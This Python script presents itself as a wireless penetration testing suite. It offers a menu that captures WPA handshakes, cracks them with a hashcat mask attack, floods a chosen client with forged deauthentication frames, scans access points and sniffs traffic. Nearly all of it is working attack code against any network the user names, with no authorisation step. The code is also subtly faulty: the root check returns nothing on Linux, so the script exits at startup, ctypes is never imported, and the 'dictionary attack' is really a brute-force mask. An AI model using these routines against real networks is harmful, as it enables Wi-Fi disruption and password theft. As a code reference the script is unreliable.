from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
from scapy.layers.eap import EAPOL
import os
import threading
import subprocess

# Make sure the script is running as root
def check_permissions(): 
    if os.name == 'posix':
        if os.getuid() == 0:
            print("Running with root priveleges")
        else:
            print("Root privileges required to run this script.")
            exit(1)
    else:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            print("Current platform does not support administrative checks.")
            return False

# Function to capture Wi-Fi handshakes
def capture_handshake(interface, target_ssid, target_bssid):
    def packet_handler(pkt):
        if pkt.haslayer(EAPOL) and pkt.addr2 == target_bssid:
            print("[+] Captured handshake from SSID: {}".format(target_ssid))
            wrpcap("handshake_{}.pcap".format(target_ssid), pkt, append=True)

    print("[*] Listening for handshakes on interface {}".format(interface))
    sniff(iface=interface, prn=packet_handler, timeout=60)

def dictionary_attack(handshake_file, mask, target_bssid):
    # Hashcat command
    hashcat_command = [
        "hashcat",
        "-m", "2500", # Specify WPA/WPA2 hashtype
        handshake_file,
        "-a", "3",
        mask
    ]

    #Run the command
    try:
        print("[*] Starting dictionary attack with hashcat...")
        subprocess.run(hashcat_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Dictionary attaack with hashcat failed: {e}")
# Rogue Access Point Detection Module

def scan_access_points(interface):
    ap_list = []

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            bssid = pkt[Dot11].addr2
            if (ssid, bssid) not in ap_list:
                ap_list.append((ssid, bssid))
                print("Detected AP: SSID: {}, BSSID: {}".format(ssid, bssid))

    print("[*] Scanning for access points on interface {}".format(interface))
    sniff(iface=interface, prn=packet_handler, timeout=60)
    
    if ap_list:
        print("\nDetected Access Points:")
        for ssid,bssid in ap_list:
            print("SSID: {}, BSSID: {}".format(ssid, bssid))
    else:
        print("No access points detected.")
    return ap_list

# WPA/WPA2 Attacks Module

def deauth_attack(interface, target_bssid, client_bssid):
    pkt = RadioTap()/Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth()
    sendp(pkt, iface=interface, count=100, inter=0.1)
    print("[*] Deauthentication attack sent to client: {}".format(client_bssid))

# Wireless Traffic Analysis

def capture_traffic(interface):
    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            print("Captured packet: {}".format(pkt.summary()))

    print("[*] Capturing wireless traffic on interface {}".format(interface))
    sniff(iface=interface, prn=packet_handler, timeout=60)

# User interface

def main():
    while True:
        print("Wireless Network Penetration Testing Suite")
        print("1. Capture Wi-Fi Handshake")
        print("2. Perform Dictionary Attack")
        print("3. Scan for Access Points")
        print("4. Perform Deauthentication Attack")
        print("5. Capture Wireless Traffic")
        print("6. Exit.")
        choice = input("Choose an option: ")

        if choice == '1':
            interface = input("Enter interface (e.g, wlan0): ")
            target_ssid = input("Enter target SSID: ")
            target_bssid = input("Enter target BSSID: ")
            capture_thread = threading.Thread(target=capture_handshake, args=(interface, target_ssid, target_bssid))
            capture_thread.start()
            capture_thread.join()
        elif choice == '2':
            handshake_file = input("Enter handshake file (e.g., handshake.pacap): ")
            mask = input("Enter mask for mask attack (e.g., ?a?a?a?a?a?a?a?a): ")
            target_bssid = input("Enter target BSSID: ")
            dictionary_attack(handshake_file, mask, target_bssid)
        elif choice == '3':
            interface = input("Enter interface (e.g., wlan0): ")
            scan_access_points(interface)
        elif choice == '4':
            interface = input("Enter interface (e.g., wlan0): ")
            target_bssid = input("Enter target BSSID: ")
            client_bssid = input("Enter client BSSID: ")
            deauth_attack(interface, target_bssid, client_bssid)
        elif choice == '5':
            interface = input("Enter interface (e.g., wlan0): ")
            capture_traffic(interface)
        elif choice == '6':
            break
        else:
            print("invalid choice")

if __name__ == "__main__":
    if check_permissions():
            print("Running with administrative privileges.")
    else:
        print("Administrative privileges required to run this script.")
        sys.exit(1)
    main()
